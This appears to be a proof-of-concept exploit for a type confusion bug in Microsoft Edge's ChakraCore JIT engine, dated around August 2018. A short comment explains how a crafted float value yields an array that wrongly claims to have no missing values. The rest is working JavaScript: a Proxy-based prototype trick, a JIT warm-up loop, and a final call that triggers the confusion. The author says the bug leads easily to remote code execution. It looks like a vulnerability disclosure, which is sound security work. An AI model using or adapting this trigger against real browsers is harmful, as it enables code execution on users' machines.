/**********
Here is a Type Confusion bug in Edge latest version.
The float value 5.562748303551415e-309 is equal 0x00040002fff80002, because FLOATVAR is on,
so if we change it to var array, it will xor with 0xfffc000000000000 and become 0xfff80002fff80002.

At last, we get an array which |HasNoMissingValues| is true but there is a |0xfff80002fff80002| in its head segement.

This can lead to type confusion in JIT code, please see the below code for details.

We can very easy use this bug to get RCE under Edge Context(fake a object and read any object address).

My test environment:
Windows 10 10.0.17134.228(The latest Win 1803 on 2018-8-28)
The latest Windows WIP slow ring(2018-8-28)
The latest chakraCore code from github master branch(2018-8-28)
*******************/
let evil = [5.562748303551415e-309 ,5.562748303551415e-309 ,{}];

let victim = [1.1,2.2,3.3];
victim.getPrototypeOf = Object.prototype.valueOf;

evil.__proto__ = new Proxy({}, victim);

function jit(victim, evil){
	let xxx = [1.1];
	victim[0] = 1.1;
	let result = xxx.concat(evil);
	victim[1] = 6.17651672645e-312;
}

for(let i = 0;i < 10000;i++){
	jit([1.1,2.2,3.3], [{},{}]);
}

Array.isArray([]);
jit(victim, evil);

print(victim[1]);